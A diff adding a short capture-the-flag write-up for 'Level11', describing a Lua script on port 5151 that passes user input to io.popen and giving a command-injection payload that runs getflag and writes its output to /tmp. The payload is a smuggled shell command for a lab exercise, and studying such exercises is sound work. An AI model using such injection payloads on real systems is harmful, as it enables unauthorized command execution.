@@ -1,0 +1,4 @@
+In Level11 there is a script waiting for connection on port 5151 and getting user input into  
+	prog = io.popen("echo "..pass.." | sha1sum", "r")
+so we need to escape and run our code like so:
+	$(getflag > /tmp/flag && chmod 777 /tmp/flag)
